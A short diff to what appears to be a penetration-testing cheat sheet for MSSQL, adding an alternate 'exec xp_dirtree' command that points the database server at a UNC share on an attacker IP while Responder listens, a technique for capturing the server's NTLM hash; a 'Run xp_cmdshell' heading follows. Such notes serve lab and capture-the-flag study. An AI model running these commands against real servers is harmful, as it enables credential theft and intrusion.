@@ -15,6 +15,9 @@ sudo responder -I tun0
 ```mysql
 # Inside mssql terminal
 xp_dirtree '\\10.10.14.10\any\thing';
+
+# Or
+use master; exec xp_dirtree '\\10.10.14.10\any\thing';
 ```
 
 #### Run xp_cmdshell
